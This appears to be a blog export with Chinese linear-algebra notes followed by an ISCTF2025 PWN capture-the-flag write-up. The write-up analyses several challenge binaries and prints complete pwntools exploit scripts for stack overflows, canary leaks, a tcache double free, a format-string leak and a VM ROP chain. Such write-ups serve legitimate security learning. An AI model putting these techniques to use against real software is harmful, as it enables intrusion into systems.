定理1：线性空间的一个非空子集构成子空间的充要条件是该非空子集对于线性空间的加法与数乘运算是封闭的
定理2：非空子集是线性空间的一个非空子集，则中一切向量的所有线性组合构成的集合是中包含的最小的子空间，此集合是生成的子空间，记作
定理3：两个子空间的交与和也是子空间
定理4：
基变换
对于同一向量空间的两组基，向量在两组基下的坐标分别是
将写成由的线性表示 

称矩阵为由基到基的过渡矩阵
若要判断某一个向量组是不是基，可以看能不能用一组基右乘一个可逆矩阵得到该向量组
对于同一向量空间的两组基，向量在两组基下的坐标分别是
基到的过渡矩阵为，则或
线性变换
设和均是数域上的线性空间，若映射满足满足  则称为从到的线性映射，也称线性变换或线性算子
对于为零变换，为恒等（单位）变换，为相似变换
对于从到的线性变换，有
性质1：
性质2：若，则
性质3：在中线性相关的向量组经过线性变换一定在中线性相关（逆命题是错的）
性质4：在中线性无关的向量组经过线性变换一定在中线性无关
线性变换的加法和数乘也满足线性空间的八条规则，由线性变换组成的线性空间称为变换空间，记为
线性变换的矩阵表示
两个线性空间和满足，为从到的线性变换，分别取和的基
将的像写成由的线性表示 

称矩阵为线性变换的关于基和基的矩阵，记作
类似于基变换，也可以用矩阵求线性变换后的像的坐标
设线性变换的关于基和基的矩阵为，向量在基下的坐标为，且在基下的坐标，则
向量在线性变换后的像的坐标
设线性变换的关于基和基的矩阵为，向量在基下的坐标为，且在基下的坐标为，则
线性变换在不同基的表示
设和为线性空间，则对于给定的线性变换，其关于和的两个不同基和的矩阵和是等价的，即存在可逆矩阵和使
设是线性空间上的线性变换，若在两组基下的矩阵分别为和，且从基到基的过渡矩阵为，则
内积空间
若属于实数域上的线性空间，规定一种规则使和对应一个实数，且满足下列条件  则称为向量和的内积，定义内积的实线性空间称为实内积空间或欧几里得空间（欧式空间）
规定标准内积  有 
长度


柯西-施瓦茨不等式： 
夹角


若两两正交，则  施密特正交化方法：
由一组线性无关的维向量求得一个标准正交向量组并且满足向量组与向量组等价 


]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTF2025</title>
    <url>/2025/12/07/ISCTF2025/</url>
    <content><![CDATA[ISCTF2025 PWN
sign
__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  _DWORD buf[38]; // [rsp+0h] [rbp-A8h] BYREF  unsigned __int64 v5; // [rsp+98h] [rbp-10h]  v5 = __readfsqword(0x28u);  memset(buf, 0, 140);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  puts(&quot;do you like blueshark?&quot;);  if ( read(0, buf, 0x3E8uLL) &lt;= 0 )  &#123;    puts(&quot;&quot;);  &#125;  else  &#123;    printf(&quot;data.arr[2] = 0x%x\n&quot;, buf[27]);    if ( buf[27] == 0xADDAAAAA )    &#123;      puts(&quot;blueshark likes you too!&quot;);      system(&quot;/bin/sh&quot;);    &#125;    else    &#123;      puts(&quot;no love anymore...&quot;);    &#125;  &#125;  return 0LL;&#125;
简单的溢出覆盖即可getshell
p=start()p.recvuntil(b&quot;do you like blueshark?\n&quot;)payload=b&quot;a&quot;*0x6c+p64(0xADDAAAAA)p.send(payload)p.interactive()
ret2rop
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char str[10]; // [rsp+6h] [rbp-Ah] BYREF  memset(str, 0, sizeof(str));  init();  puts(&quot;if you want to watch demo&quot;);  __isoc99_scanf(&quot;%10s&quot;, str);  getchar();  if ( !strcmp(str, &quot;yes&quot;) )    demo();  puts(&quot;now solve this pratice&quot;);  vuln();  return 0;&#125;
进入vuln
void __cdecl vuln()&#123;  $F60773D3744C13F48A6AC74423E18A6D frame; // [rsp+0h] [rbp-50h] BYREF  ssize_t n; // [rsp+40h] [rbp-10h]  ssize_t i; // [rsp+48h] [rbp-8h]  puts(&quot;please int your name&quot;);  read(0, name, 0x10uLL);  puts(&quot;please introduce yourself&quot;);  getRandom(frame.mask, 32LL);  n = read(0, &amp;frame, 0x100uLL);  if ( n &gt; 0 )  &#123;    for ( i = 0LL; i &lt; n; ++i )      frame.buf[i] ^= frame.mask[i];  &#125;&#125;
 ~/ISCTF/ret2rop  checksec ./pwn                                                                                                   [*] &#x27;/home/ubuntu/ISCTF/ret2rop/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No    Debuginfo:  Yes
给了很多gadget，有后门system、pop rsi、mov rdi, rsi等等
name在bss段上
有个坑点就是虽然给了/bin/sh但是不能用，后面有一个”，只能使用bss段上写入/bin/sh00来利用了
.rodata:00000000004020D0 ; const char s[].rodata:00000000004020D0 s               db 1Bh,&#x27;[32m&gt;&gt;&gt; Success: Entered target function (simulated system(&quot;/&#x27;.rodata:00000000004020D0                                         ; DATA XREF: gadget_call_target+20↑o.rodata:000000000040210E                 db &#x27;bin/sh&quot;))&#x27;,1Bh,&#x27;[0m&#x27;,0.rodata:000000000040211C                 align 20h
这个异或也是挺有意思的
00000000 struct $F60773D3744C13F48A6AC74423E18A6D // sizeof=0x4000000000 &#123;                                       // XREF: vuln/r00000000     char buf[32];00000020     char mask[32];                      // XREF: vuln+82/o00000040 &#125;;
也就是说后面的与前面的异或后填到前面，只需用0异或就可以保证不变
可以用pop rsi + addr(/bin/sh) + mov rdi, rsi + call system，但是实际上发现system没有16位对齐，要加一个retn
这样就是5个p64了，但是异或是隔4个p64
p64(0) + p64(0) + p64(0) + p64(0) + retn + pop rsi + addr(/bin/sh\x00) + mov rdi, rsi + call system
会变成
retn + pop rsi + addr(/bin/sh\x00) + mov rdi, rsi + call system^retn
异或是可逆的，只用将call system 改为 call system^retn 就行了
p=start()orig_binsh_addr=0x40210dinput_binsh_addr=0x4040f0system_addr=0x401A39mov_rdi_addr=0x401A25pop_rsi_addr=0x401A1Cretn_addr=0x401C15p.recvuntil(b&quot;if you want to watch demo\n&quot;)p.sendline(b&quot;no&quot;)p.recvuntil(b&quot;please int your name\n&quot;)p.send(b&quot;/bin/sh\x00&quot;)p.recvuntil(b&quot;please introduce yourself\n&quot;)payload=p64(0)*(11+4)+p64(retn_addr)+p64(pop_rsi_addr)+p64(input_binsh_addr)+p64(mov_rdi_addr)+p64(0x62c)+p64(0)*8p.send(payload)p.interactive()
ez2048
保护详情
 ~/ISCTF/ez2048  checksec ./pwn                                                                                                   [*] &#x27;/home/ubuntu/ISCTF/ez2048/pwn&#x27;    Arch:       amd64-64-little    RELRO:      No RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char n81; // [rsp+Fh] [rbp-51h]  char dest[72]; // [rsp+10h] [rbp-50h] BYREF  unsigned __int64 v6; // [rsp+58h] [rbp-8h]  v6 = __readfsqword(0x28u);  score = 50;  init(argc, argv, envp);  printf(&quot;Welcome to ISCTF2025\ninput your name\n&gt;&quot;);  read(0, buf, 0x32uLL);  buf[strcspn(buf, &quot;\n&quot;)] = 0;  strcpy(dest, &quot;Hello,&quot;);  strcat(dest, buf);  strcpy(buf, dest);  printf(&quot;%s,I won&#x27;t give you the shell until you get 100,000 points,Press \&quot;Enter\&quot; to start the game&quot;, buf);  getchar();  while ( 1 )  &#123;    playgame();    printf(&quot;Enter \&quot;Q\&quot; to settle and exit. Enter any other characters to start a new round\n&gt;&quot;);    getchar();    n81 = getchar();    if ( n81 == 81 || n81 == 113 )      break;    getchar();  &#125;  final();  return 0;&#125;
playgame没有什么漏洞
__int64 playgame()&#123;  unsigned int seed; // eax  char v2; // [rsp+Eh] [rbp-52h]  _BYTE v3[64]; // [rsp+10h] [rbp-50h] BYREF  char v4; // [rsp+50h] [rbp-10h]  unsigned __int64 v5; // [rsp+58h] [rbp-8h]  v5 = __readfsqword(0x28u);  seed = time(0LL);  srand(seed);  init_game(v3);  while ( 1 )  &#123;    draw_game(v3);    if ( v4 )      break;    switch ( (unsigned __int8)get_user_input() )    &#123;      case &#x27;a&#x27;:        v2 = move_left(v3);        goto LABEL_10;      case &#x27;d&#x27;:        v2 = move_right(v3);        goto LABEL_10;      case &#x27;q&#x27;:        puts(&quot;\ngame over!&quot;);        score -= 10;        printf(&quot;your score:%d\n&quot;, score);        return 0LL;      case &#x27;s&#x27;:        v2 = move_down(v3);        goto LABEL_10;      case &#x27;w&#x27;:        v2 = move_up(v3);LABEL_10:        if ( v2 )        &#123;          spawn_new_number(v3);          v4 = check_game_over(v3);        &#125;        break;      default:        continue;    &#125;  &#125;  getchar();  return 0LL;&#125;
主要的漏洞出在final
__int64 final()&#123;  puts(&quot;checking your score...&quot;);  sleep(1u);  printf(&quot;your score:%u\ntarget score:100000\n&quot;, score);  sleep(1u);  if ( (unsigned int)score &lt;= 0x1869F )  &#123;    puts(&quot;Your score doesn&#x27;t meet the target,so you are not suitable for the flag yet...&quot;);  &#125;  else  &#123;    puts(&quot;here is your shell&quot;);    sleep(1u);    shell();  &#125;  sleep(1u);  return 0LL;&#125;
将一个int的类型转换为unsigned int，这样就可以利用playgame的q反复扣除分数到负数，这样比较时就把score当作了一个很大的正数，经典的漏洞了
再来看shell
__int64 shell()&#123;  int v1; // [rsp+Ch] [rbp-94h]  _QWORD buf[18]; // [rsp+10h] [rbp-90h] BYREF  buf[17] = __readfsqword(0x28u);  getchar();  while ( 1 )  &#123;    while ( 1 )    &#123;      memset(buf, 0, 128);      printf(&quot;$ &quot;);      v1 = read(0, buf, 0x128uLL);      if ( v1 &gt;= 0 )        break;      perror(&quot;read error&quot;);    &#125;    if ( v1 &gt; 0 &amp;&amp; *((_BYTE *)buf + v1 - 1) == 10 )      *((_BYTE *)buf + v1 - 1) = 0;    printf(&quot;executing command: &quot;);    puts((const char *)buf);    sleep(1u);    if ( !strcmp((const char *)buf, &quot;exit&quot;) )      break;    if ( !strcmp((const char *)buf, &quot;ls&quot;) )      system((const char *)buf);    else      printf(&quot;command not found: %s\n&quot;, (const char *)buf);  &#125;  return 0LL;&#125;
第一眼看到的是只能执行对应命令，而不是任意命令，第二眼却发现这个函数有栈溢出
可以利用溢出泄露出canary，使用一字节覆盖canary的，这样就可以打印出canary的其他部分
这题还给了gadget，所以得到canary后，利用ret2text很容易就可以getshell
一样是可以在一开始的buf中写入/bin/sh
.bss:0000000000404A40 ; char buf[56].bss:0000000000404A40 buf             db 38h dup(?)           ; DATA XREF: main+48↑o.bss:0000000000404A40                                         ; main+66↑o ....bss:0000000000404A40 _bss            ends.bss:0000000000404A40
exp如下
p=start()pop_rdi_addr=0x40133Ecall_system_addr=0x401514p.recvuntil(b&quot;Welcome to ISCTF2025\ninput your name\n&gt;&quot;)p.send(b&quot;/bin/sh\x00\x00&quot;)p.recvuntil(b&quot;Press \&quot;Enter\&quot; to start the game&quot;)p.send(b&quot;\n&quot;)for i in range(5):    sleep(0.1)    p.send(b&quot;q\n&quot;)    p.recvuntil(b&quot;Enter any other characters to start a new round\n&gt;&quot;)    p.send(b&quot;a\n&quot;)sleep(0.1)p.send(b&quot;q\n&quot;)p.recvuntil(b&quot;Enter any other characters to start a new round\n&gt;&quot;)p.send(b&quot;Q\n&quot;)p.recvuntil(b&quot;$ &quot;)payload0=b&quot;a&quot;*0x89p.send(payload0)p.recvuntil(b&quot;a&quot;*0x89)canary_leak = p.recvn(7)canary_bytes = b&#x27;\x00&#x27;+canary_leakcanary = u64(canary_bytes)log.success(f&quot;完整 canary(8 字节): 0x&#123;canary:016x&#125;&quot;)payload=b&quot;exit\x00\x00\x00\x00&quot;+b&quot;\x00&quot;*0x80+p64(canary)+p64(0)+p64(pop_rdi_addr)+p64(0x404A46)+p64(call_system_addr)p.send(payload)p.interactive()
ez_tcache_attachment
一道堆题，保护如下
 ~/ISCTF/ez_tcache_attachment  checksec ./pwn                                                                                       [*] &#x27;/home/ubuntu/ISCTF/ez_tcache_attachment/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    RUNPATH:    b&#x27;./glibc&#x27;    Stripped:   No
经典菜单
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  unsigned int n2; // eax  inital(argc, argv, envp);  welcome();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      n2 = get_int();      if ( n2 != 2 )        break;      delete();    &#125;    if ( n2 &gt; 2 )    &#123;      if ( n2 == 3 )      &#123;        show();      &#125;      else      &#123;        if ( n2 == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice!&quot;);      &#125;    &#125;    else    &#123;      if ( n2 != 1 )        goto LABEL_13;      add();    &#125;  &#125;&#125;
没什么好说的，只有UAF，没有edit函数
int add()&#123;  _BYTE *n10; // rax  unsigned int i_1; // [rsp+0h] [rbp-10h]  unsigned int i; // [rsp+4h] [rbp-Ch]  unsigned int size; // [rsp+8h] [rbp-8h]  int size_4; // [rsp+Ch] [rbp-4h]  i_1 = -1;  for ( i = 0; i &lt;= 0x15; ++i )  &#123;    if ( !nodes[i] )    &#123;      i_1 = i;      break;    &#125;  &#125;  if ( i_1 == -1 )  &#123;    LODWORD(n10) = puts(&quot;Out of space!&quot;);  &#125;  else  &#123;    printf(&quot;Size: &quot;);    size = get_int();    if ( size &lt;= 0x400 )    &#123;      nodes[i_1] = malloc(size);      printf(&quot;Content: &quot;);      size_4 = read_n(nodes[i_1], size);      LODWORD(n10) = *(unsigned __int8 *)((unsigned int)(size_4 - 1) + nodes[i_1]);      if ( (_BYTE)n10 == 10 )      &#123;        n10 = (_BYTE *)((unsigned int)(size_4 - 1) + nodes[i_1]);        *n10 = 0;      &#125;    &#125;    else    &#123;      LODWORD(n10) = puts(&quot;Invalid size!&quot;);    &#125;  &#125;  return (int)n10;&#125;
void delete()&#123;  unsigned int n0x15; // [rsp+Ch] [rbp-4h]  printf(&quot;Index: &quot;);  n0x15 = get_int();  if ( n0x15 &lt;= 0x15 &amp;&amp; nodes[n0x15] )    free((void *)nodes[n0x15]);  else    puts(&quot;Invalid index!&quot;);&#125;
int show()&#123;  unsigned int n0x15; // [rsp+Ch] [rbp-4h]  printf(&quot;Index: &quot;);  n0x15 = get_int();  if ( n0x15 &lt;= 0x15 &amp;&amp; nodes[n0x15] )    return printf(&quot;Content: %s\n&quot;, (const char *)nodes[n0x15]);  else    return puts(&quot;Invalid index!&quot;);&#125;
glibc版本是2.29，在libc中有检查
#if USE_TCACHE  &#123;    size_t tc_idx = csize2tidx (size);    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)      &#123;	/* Check to see if it&#x27;s already in the tcache.  */	tcache_entry *e = (tcache_entry *) chunk2mem (p);	/* This test succeeds on double free.  However, we don&#x27;t 100%	   trust it (it also matches random payload data at a 1 in	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely	   coincidence before aborting.  */	if (__glibc_unlikely (e-&gt;key == tcache))	  &#123;	    tcache_entry *tmp;	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);	    for (tmp = tcache-&gt;entries[tc_idx];		 tmp;		 tmp = tmp-&gt;next)	      if (tmp == e)		malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);	    /* If we get here, it was a coincidence.  We&#x27;ve wasted a	       few cycles, but don&#x27;t abort.  */	  &#125;	if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	  &#123;	    tcache_put (p, tc_idx);	    return;	  &#125;      &#125;  &#125;#endif
最开始就是想打__free_hook，写ogg，但是好像不行，只能用system了
先将tcache填满在放一个到unsortedbin中利用UAF得到libc基址
要在没有edit的情况下修改透过tcache检查进行double free，再进行修改tcache的fd指向__free_hook，申请出来写入system，再free掉一个写着/bin/sh00的堆就可以实现了，这就是最朴素的想法
如何修改fd呢？
我这里利用了前向合并，产生堆块堆叠，合并后再申请回来时写入fd，这样就可以绕过检查，而且可以将物理相邻的下一个堆块的prev_inuse设为1，这样就可以double free了，不过再次之前先从tcache取出一个让double free的堆块进人tcache
注意这里还是有堆块重叠，再将合并的堆块释放，再申请回来，将double free的堆块的fd改为指向`__free_hook，申请两次就可以得到__free_hook所在地址的堆块了，后面就简单了
def add(idx,size, data=b&#x27;&#x27;):    p.sendlineafter(b&#x27;Your choice: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;, str(size))    p.sendlineafter(b&#x27;Content: &#x27;, data)  # 使用sendafter而非sendlineafter，避免添加额外换行符def delete(idx):    p.sendlineafter(b&#x27;Your choice: &#x27;, b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, str(idx))def show(idx):    p.sendlineafter(b&#x27;Your choice: &#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, str(idx))p=start()add(0,0x80,b&#x27;b&#x27;*0x10)add(1,0x80,b&#x27;A&#x27;*0x10)add(2,0x80,b&#x27;b&#x27;*0x10)add(3,0x80,b&#x27;b&#x27;*0x10)add(4,0x20,b&#x27;B&#x27;*0x10)add(5,0x80,b&#x27;A&#x27;*0x10)add(6,0x80,b&#x27;A&#x27;*0x10)add(7,0x80,b&#x27;A&#x27;*0x10)add(8,0x80,b&#x27;A&#x27;*0x10)add(9,0x80,b&#x27;A&#x27;*0x10)add(10,0x80,b&#x27;A&#x27;*0x10)add(11,0x80,b&#x27;A&#x27;*0x10)delete(5)delete(6)delete(7)delete(8)delete(9)delete(10)delete(11)#pause()delete(1)show(1)main_arena_addr = u64(p.recvuntil(b&#x27;\n&#x27;, drop=True)[-6:].ljust(8, b&#x27;\x00&#x27;))log.success(f&quot;main_arena_addr: &#123;hex(main_arena_addr)&#125;&quot;) libc_base = main_arena_addr - 0x1e4ca0log.success(f&quot;libc_base: &#123;hex(libc_base)&#125;&quot;)free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]log.success(f&quot;__free_hook: &#123;hex(free_hook_addr)&#125;&quot;)log.success(f&quot;system: &#123;hex(system_addr)&#125;&quot;)ogg_addr=libc_base+0x106ef8delete(0)delete(2)add(12,0x110,b&#x27;B&#x27;*0x80+p64(0)+p64(0x91)+p64(free_hook_addr)*2)add(13,0x80,p64(free_hook_addr)*2)delete(1)delete(12)add(14,0x110,b&#x27;B&#x27;*0x80+p64(0)+p64(0x91)+p64(free_hook_addr)*2)add(15,0x80,b&quot;/bin/sh\x00&quot;)add(16,0x80,p64(system_addr))#pause()delete(15)p.interactive()
ez_fmt
保护如下
 ~/ISCTF/ez_fmt  checksec ./pwn                                                                                                   [*] &#x27;/home/ubuntu/ISCTF/ez_fmt/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdin, 0LL);  setbuf(_bss_start, 0LL);  setbuf(stderr, 0LL);  vuln();  return 0;&#125;
unsigned __int64 vuln()&#123;  char buf[136]; // [rsp+0h] [rbp-90h] BYREF  unsigned __int64 v2; // [rsp+88h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Welcome to ISCTF!&quot;);  printf(&quot;1st input: &quot;);  read(0, buf, 0x100uLL);  printf(buf);  puts(&quot;\n[leak end]\n&quot;);  printf(&quot;2nd input: &quot;);  read(0, buf, 0x200uLL);  puts(&quot;Goodbye!&quot;);  return v2 - __readfsqword(0x28u);&#125;
有后门函数，一个简单的ret2text
利用格式化字符串漏洞泄露出canary和elf基址就可以写rop链了
p=start()p.recvuntil(b&quot;1st input: &quot;)payload1=b&quot;%23$pa%25$p&quot;p.send(payload1)p.recvuntil(b&quot;0x&quot;)canary=int(p.recv(16),16)log.success(hex(canary))p.recvuntil(b&quot;a&quot;)p.recvuntil(b&quot;0x&quot;)elf_addr=int(p.recv(12),16)-97-0x12FAlog.success(hex(elf_addr))p.recvuntil(b&quot;2nd input: &quot;)win_addr=elf_addr+0x1202payload2=b&quot;a&quot;*0x88+p64(canary)+p64(0)+p64(win_addr)p.send(payload2)p.interactive()
my_vm
第一次写vm题，保护如下
 ~/ISCTF/my_vm  checksec ./pwn                                                                                                     [*] &#x27;/home/ubuntu/ISCTF/my_vm/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    Stripped:   No
开了沙箱
 ~/ISCTF/my_vm  seccomp-tools dump ./pwn                                                                                            line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0007: 0x06 0x00 0x00 0x00000000  return KILL
函数如下
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  int v4; // eax  int v6; // [rsp+Ch] [rbp-1024h]  __int64 v7; // [rsp+10h] [rbp-1020h] BYREF  void *ptr; // [rsp+18h] [rbp-1018h]  _QWORD v9[514]; // [rsp+20h] [rbp-1010h]  v9[513] = __readfsqword(0x28u);  v6 = 0;  init(argc, argv, envp);  while ( 1 )  &#123;    __isoc99_scanf(&quot;%ld&quot;, &amp;v7);    ptr = (void *)ret_code(v7);    switch ( *(_WORD *)ptr )    &#123;      case 0:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 3)] + reg[*((__int16 *)ptr + 2)];        break;      case 1:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 2)] - reg[*((__int16 *)ptr + 3)];        break;      case 2:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 2)] * reg[*((__int16 *)ptr + 3)];        break;      case 3:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 2)] / reg[*((__int16 *)ptr + 3)];        break;      case 4:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 2)] &lt;&lt; reg[*((__int16 *)ptr + 3)];        break;      case 5:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 2)] &gt;&gt; reg[*((__int16 *)ptr + 3)];        break;      case 6:        reg[*((__int16 *)ptr + 1)] = reg[*((__int16 *)ptr + 3)] ^ reg[*((__int16 *)ptr + 2)];        break;      case 7:        v3 = v6++;        v9[v3] = reg[*((__int16 *)ptr + 1)];        break;      case 8:        if ( !v6 )          exit(0);        v4 = v6--;        reg[*((__int16 *)ptr + 1)] = v9[v4];        break;      default:        break;    &#125;    if ( *(_WORD *)ptr == 9 )      return 0;    free(ptr);    ptr = 0LL;  &#125;&#125;
_WORD *__fastcall ret_code(__int64 a1)&#123;  __int64 v2; // [rsp+8h] [rbp-18h] BYREF  char *v3; // [rsp+10h] [rbp-10h]  _WORD *v4; // [rsp+18h] [rbp-8h]  v2 = a1;  v3 = (char *)&amp;v2;  v4 = malloc(8uLL);  *v4 = *v3;  v4[1] = v3[1];  v4[2] = v3[2];  v4[3] = v3[3];  return v4;&#125;
简单来说就是如果是输入0x04030201，就是01是操作码，在这个程序指相减，02指存储位置是reg[2]，03和04指进行运算的位置为reg[3]、reg[4]
一般来说，虚拟寄存器都在bss段上，而且数组索引可以是负数，这样就可以使用负索引泄露libc地址
.bss:0000000000202020 ; ===========================================================================.bss:0000000000202020.bss:0000000000202020 ; Segment type: Uninitialized.bss:0000000000202020 ; Segment permissions: Read/Write.bss:0000000000202020 _bss            segment align_32 public &#x27;BSS&#x27; use64.bss:0000000000202020                 assume cs:_bss.bss:0000000000202020                 ;org 202020h.bss:0000000000202020                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000202020                 public stdout@@GLIBC_2_2_5.bss:0000000000202020 ; FILE *stdout.bss:0000000000202020 stdout@@GLIBC_2_2_5 dq ?                ; DATA XREF: init+4↑r.bss:0000000000202020                                         ; LOAD:0000000000203198↓o.bss:0000000000202020                                         ; Alternative name is &#x27;stdout&#x27;.bss:0000000000202020                                         ; Copy of shared data.bss:0000000000202028                 align 10h.bss:0000000000202030                 public stdin@@GLIBC_2_2_5.bss:0000000000202030 ; FILE *stdin.bss:0000000000202030 stdin@@GLIBC_2_2_5 dq ?                 ; DATA XREF: init+22↑r.bss:0000000000202030                                         ; LOAD:00000000002031E0↓o.bss:0000000000202030                                         ; Alternative name is &#x27;stdin&#x27;.bss:0000000000202030                                         ; Copy of shared data.bss:0000000000202038                 align 20h.bss:0000000000202040                 public stderr@@GLIBC_2_2_5.bss:0000000000202040 ; FILE *stderr.bss:0000000000202040 stderr@@GLIBC_2_2_5 dq ?                ; DATA XREF: init+40↑r.bss:0000000000202040                                         ; LOAD:0000000000203228↓o.bss:0000000000202040                                         ; Alternative name is &#x27;stderr&#x27;.bss:0000000000202040                                         ; Copy of shared data.bss:0000000000202048 completed_7698  db ?                    ; DATA XREF: __do_global_dtors_aux↑r.bss:0000000000202048                                         ; __do_global_dtors_aux+28↑w.bss:0000000000202049                 align 20h.bss:0000000000202060                 public reg.bss:0000000000202060 ; __int64 reg[16].bss:0000000000202060 reg             dq 10h dup(?)           ; DATA XREF: main+AC↑o.bss:0000000000202060                                         ; main+CD↑o ....bss:0000000000202060 _bss            ends.bss:0000000000202060
在虚拟寄存器中计算好偏移并构造地址，使用push将地址放入栈中，这样就可以构造rop链
值得注意的是，当栈上的索引v6刚好指向canary时，可以使用pop将canary放入reg中，后面再用reg的canary使用push到原来的栈上的canary，这样就不会破坏canary，可以绕过canary保护
def crun(content):    p.sendline(str(content).encode())    sleep(0.01)def add(times):    crun(0x10e0700)    for i in range(times):        crun(0x2070702)    crun(0x7080800)p=start()for i in range(513):    crun(0xa07)  #移动v6指向canarycrun(0xb08)      #将canary储存在0xbcrun(0xa07)      #由于pop一次，再push一次crun(0xb07)      #push canarycrun(0xa07)      #push rbp#opencrun(0x1f00001)   # num=libccrun(0x103)       # num=1crun(0x1010204)   # num=2crun(0x1020304)   # num=4crun(0x1030404)   # num=8crun(0x2030504)   # num=16#open 0xea720 read 0xeaa10 write 0xeaab0#pop rdi 0x625 rsi 0x2091 rdx 0x666e9crun(0x2040600)   # 10crun(0x6010704)   # 1024crun(0x1070805)   # 512crun(0x7080700)crun(0x3010804)crun(0x1080804)crun(0x7080700)crun(0x7030700)crun(0x7010700)crun(0x7000700)crun(0x707)crun(0x9f50900)   # num=elfcrun(0x4050602)crun(0x6050600)crun(0x6050600)crun(0x6050600)crun(0x6040600)crun(0x6090600)crun(0x607)crun(0x8080801)add(38)add(37)add(34)add(33)add(32)add(30)add(29)add(24)add(22)add(21)add(19)add(18)add(14)add(13)add(10)add(9)add(5)add(3)add(2)add(1)crun(0x1080c00)crun(0x8080801)add(13)add(7)add(4)crun(0x1080800)crun(0x8000800)crun(0x807)crun(0x8080801)crun(0x807)crun(0x8080801)add(19)add(18)add(17)add(15)add(13)add(10)add(9)add(8)add(5)crun(0x8000800)crun(0x807)#readcrun(0x8080801)add(10)add(9)add(5)add(2)crun(0x1080800)crun(0x8000800)crun(0x807)crun(0x8080801)crun(0x1020800)crun(0x807)crun(0x8080801)add(13)add(7)add(4)crun(0x1080800)crun(0x8000800)crun(0x807)crun(0x8080801)crun(0x5050802)crun(0x9080800)crun(0x807)crun(0x8080801)add(18)add(17)add(14)add(13)add(10)add(9)add(7)add(6)add(5)add(3)crun(0x1080800)crun(0x8000800)crun(0x807)crun(0x8080801)crun(0x5050802)crun(0x807)crun(0x8080801)crun(0x807)crun(0x8080801)add(19)add(18)add(17)add(15)add(13)add(11)add(9)add(4)crun(0x8000800)crun(0x807)#writecrun(0x8080801)add(10)add(9)add(5)add(2)crun(0x1080800)crun(0x8000800)crun(0x807)crun(0x8080801)crun(0x1080800)crun(0x807)crun(0x8080801)add(13)add(7)add(4)crun(0x1080800)crun(0x8000800)crun(0x807)crun(0x8080801)crun(0x5050802)crun(0x9080800)crun(0x807)crun(0x8080801)add(19)add(18)add(17)add(15)add(13)add(11)add(9)add(7)add(5)add(4)crun(0x8000800)crun(0x807)crun(0x9)     # 触发rop链p.interactive()
ez_stack
保护如下
 ~/ISCTF/ezstack  checksec ./pwn                                                                                                   [*] &#x27;/home/ubuntu/ISCTF/ezstack/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled
函数如下
__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  sub_1429(a1, a2, a3);  sub_13B3(0LL, 0x114514000LL, 16LL);  sub_150A();  sub_1785();  sub_1637();  return 0LL;&#125;
unsigned __int64 sub_1429()&#123;  int v1; // [rsp+8h] [rbp-28h]  int i; // [rsp+Ch] [rbp-24h]  _BYTE Welcome_to_ISCTF2025_[24]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v4; // [rsp+28h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 23; ++i )  &#123;    Welcome_to_ISCTF2025_[i] = 0;    ++v1;  &#125;  qmemcpy(Welcome_to_ISCTF2025_, &quot;Welcome to ISCTF2025!&quot;, 21);  sub_1343(Welcome_to_ISCTF2025_);  sub_1149(0x114514000LL, 4096LL, 7LL, 34LL, -1LL, 9LL);  return v4 - __readfsqword(0x28u);&#125;
